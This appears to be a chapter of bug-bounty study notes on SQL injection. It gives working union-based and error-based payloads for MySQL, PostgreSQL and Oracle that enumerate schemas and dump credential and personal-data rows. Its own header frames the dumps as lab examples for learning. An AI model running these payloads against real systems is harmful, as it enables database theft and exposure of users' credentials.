# Ch 6 — SQL Injection

> **Extraction is narrative:** the `group_concat`/`concat` credential dumps below are the book's lab-grade escalation examples — on a live program the PoC is a true/false differential or a short `sleep()`. Never pull rows, never dump `uname:pass` — "dumping users' data violates the program" (see `sources.md` payload policy).

Root cause: string concatenation of user input into queries. Detection is universal: **throw single and double quotes (`'`, `"`, `%27`) at every parameter until you see an SQL error** — then read the error for the DB fingerprint (`psycopg2` → Postgres, `ORA-` → Oracle, mysql syntax → MySQL).

Do it by hand first — SqlMap after you understand the process (`github.com/sqlmapproject/sqlmap`).

## Universal workflow

1. `'` / `"` → error confirms injection + fingerprints DB.
2. `order by N` (increment N until error) → column count.
3. `union all select 1,2,3` (make first query return nothing — invalid id) → numbers printed on page = **displayable columns**.
4. Enumerate tables → columns → dump (`information_schema` for MySQL/PG; `all_tables`/`all_tab_columns` for Oracle).

## MySQL — union based

```sql
order by 1..N                              -- column count
union all select 1,2,3                     -- find displayed columns (use invalid id)
union all select 1,@@version,3             -- or version()
union all select 1,2,group_concat(table_name)
    from information_schema.tables
    where table_schema = database()        -- tables in current DB
union all select 1,2,group_concat(column_name)
    from information_schema.columns
    where table_name = 'users'             -- columns of target table
union all select 1,2,group_concat(uname,':',pass) from users
```

Key functions: `@@version`/`version()`, `database()`, `group_concat()` (joins rows into one output).

## MySQL — error based (extractvalue, ≥5.1)

When there's no output except the error itself, leak data through the error message:

```sql
AND extractvalue("blahh",concat(";",@@version))
AND extractvalue("blahh",(select concat(";",table_name)
    from information_schema.tables
    where table_schema = database() limit 0,1))
AND extractvalue("blahh",(select concat(";",column_name)
    from information_schema.columns
    where table_name = 'users' limit 0,1))
AND extractvalue("blahh",(select concat(";",uname,":",pass)
    from users limit 0,1))
```

One row at a time — `limit 0,1` then `limit 1,1`, etc. (`extractvalue()` errors on XPath starting with `;` and echoes the parsed value.)

## PostgreSQL — union based

Same shape, different details:

- Column types must match → use `null` placeholders: `union all select null,null`.
- No `group_concat` → paginate with `offset N`; filter system schemas.
- `version()` fingerprints the engine.

```sql
union all select 1,table_name from information_schema.tables
    where table_schema != 'pg_catalog'
      and table_schema != 'information_schema' offset 0
union all select 1,column_name from information_schema.columns
    where table_name = 'users' offset 0
union all select 1,concat(username,':',password) from users offset 0
```

## Oracle — union based

Different catalog + concat syntax; `select` **requires a table** (use `dual`):

```sql
select banner from v$version               -- DB version (from dual)

union all select LISTAGG(table_name,',') within group (ORDER BY table_name),null
    from all_tables where tablespace_name = 'USERS' --
union all select LISTAGG(column_name,',') within group (ORDER BY column_name),null
    from all_tab_columns where table_name = 'EMPLOYEES'--
union all select email,phone_number from employees
```

- `all_tables` (filter `tablespace_name='USERS'` to skip hundreds of defaults), `all_tab_columns`.
- `LISTAGG(x,',') within group (ORDER BY x)` = Oracle's `group_concat`.
- Errors start with `ORA-`.

## Takeaway

Process is identical across engines: count columns → find displayed ones → tables → columns → rows. Learn all three dialects — "unlike 90% of hackers" you won't be stuck when it's not MySQL.
